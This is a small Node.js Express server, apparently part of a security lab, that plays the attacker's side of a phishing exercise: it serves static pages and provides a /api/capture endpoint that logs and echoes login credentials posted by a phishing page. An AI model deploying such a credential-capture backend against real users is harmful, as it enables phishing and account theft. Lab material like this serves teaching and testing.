'use strict';
const express = require('express');
const path = require('path');

const app = express();

// Serve all public files from the attacker origin
app.use(express.static(path.join(__dirname, 'public')));

// X4 phishing login capture endpoint
app.post('/api/capture', express.urlencoded({ extended: false }), express.json(), (req, res) => {
  // The phishing page POSTs captured credentials here; server just echoes for lab purposes
  const data = req.body;
  console.log('[attacker] Captured credentials:', data);
  res.json({ captured: true, data });
});

app.listen(3001, () => console.log('[attacker] http://localhost:3001'));
